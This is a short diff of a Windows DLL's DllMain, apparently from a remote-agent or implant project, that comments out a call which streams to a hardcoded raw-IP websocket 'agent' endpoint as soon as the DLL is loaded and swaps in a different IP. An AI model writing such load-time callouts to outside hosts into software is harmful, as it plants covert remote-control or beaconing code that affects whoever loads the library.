@@ -366,8 +366,8 @@ BOOL APIENTRY DllMain(
     {
     case DLL_PROCESS_ATTACH:
     {
-        Stream_Start("ws://69.48.228.229:8080/agent/123/stream");
-        DisableThreadLibraryCalls(hModule);
+        //Stream_Start("ws://103.90.224.132:8080/agent/stream");
+        //DisableThreadLibraryCalls(hModule);
         break;
     }
 
